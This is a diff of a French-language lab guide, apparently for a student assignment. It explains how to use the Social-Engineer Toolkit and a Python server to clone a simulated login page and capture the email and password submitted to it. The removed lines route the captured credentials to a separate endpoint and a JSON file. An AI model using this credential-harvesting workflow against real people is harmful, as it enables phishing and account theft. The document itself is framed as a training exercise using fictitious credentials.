@@ -1,58 +1,43 @@
-# Capture des identifiants (sans dependre du terminal SET)
+# SET : pourquoi tu ne vois que GET /
 
-SET sur le port **80** n'affiche souvent qu'un `GET /` car la page envoie les donnees ailleurs.
-Utilise ton **serveur Python** sur le port **8765** pour recevoir le POST.
+## Explication
 
-## Methode recommandee (simple)
+| Port | Ce qui se passe |
+|------|-----------------|
+| **80** (SET) | La page envoie un **formulaire POST** vers `/` → SET affiche les identifiants |
+| **8765** (python server.py) | La page envoie un **fetch JSON** → affichage dans le terminal Python |
 
-**Terminal 1 :**
-```powershell
-cd c:\Users\benja\Desktop\Perso\bruteforce\Test
-python server.py
-```
+Si la page clonee utilise encore l'ancienne version (fetch vers 8765), SET n'affichera **jamais** de POST, seulement `GET /`.
 
-**Navigateur :**
-```
-http://127.0.0.1:8765/login-simulation.html
-```
+## Procedure SET (terminal SET doit afficher POST)
 
-Parcours : e-mail -> Suivant -> mot de passe -> Suivant.
+1. **Pousser** la derniere `login-simulation.html` sur GitHub et attendre 1-2 min
+2. Lancer SET, cloner : `https://bmouchet04.github.io/Test/login-simulation.html`
+3. Ouvrir : `http://127.0.0.1/` ou `http://172.17.216.224/` (port **80**, pas GitHub, pas :8765)
+4. **Ne pas** lancer `python server.py` pour ce test (optionnel)
+5. Parcours complet : e-mail → Suivant → mot de passe → Suivant
 
-Tu dois voir dans le terminal :
+Resultat attendu dans SET :
 ```text
-[CAPTURE] test@eleve.fr / motdepasse123 (depuis 127.0.0.1)
+POST / HTTP/1.1
+username=xxx&password=yyy
 ```
 
-Et dans `captures.json`.
+## Procedure Python (sans SET)
 
-## Avec SET + serveur Python (2 terminaux)
-
-**Terminal 1 — SET** (port 80, clone GitHub)
-
-**Terminal 2 :**
 ```powershell
 python server.py
 ```
 
-1. Pousser la derniere `login-simulation.html` sur GitHub
-2. SET clone : `https://bmouchet04.github.io/Test/login-simulation.html`
-3. Ouvrir : `http://127.0.0.1/` ou `http://172.17.216.224/` (page SET, port 80)
-4. Le POST part automatiquement vers `http://172.17.216.224:8765/api/enregistrer`
+Ouvrir : `http://127.0.0.1:8765/login-simulation.html`
 
-SET peut n'afficher que `GET /` — c'est normal. Les identifiants sont dans le terminal **python server.py** et `captures.json`.
-
-## Forcer l'URL de l'API
-
-```
-http://172.17.216.224/?api=http://172.17.216.224:8765/api/enregistrer
+Resultat dans le terminal Python :
+```text
+[CAPTURE] email / password
 ```
 
-## Ne pas confondre
+## Les 3 erreurs frequentes
 
-| URL | Resultat |
-|-----|----------|
-| GitHub Pages seul | POST vers `:8765` echoue si le serveur Python n'est pas lance |
-| `localhost:8765` | Fonctionne directement |
-| SET port 80 + `python server.py` | POST vers 8765, capture OK |
-
-Utilise uniquement des identifiants **fictifs** pour le devoir.
+1. Tester sur **GitHub Pages** au lieu de l'IP SET (port 80)
+2. Ne pas aller jusqu'a l'etape **mot de passe**
+3. Cloner une **ancienne version** non poussee sur GitHub
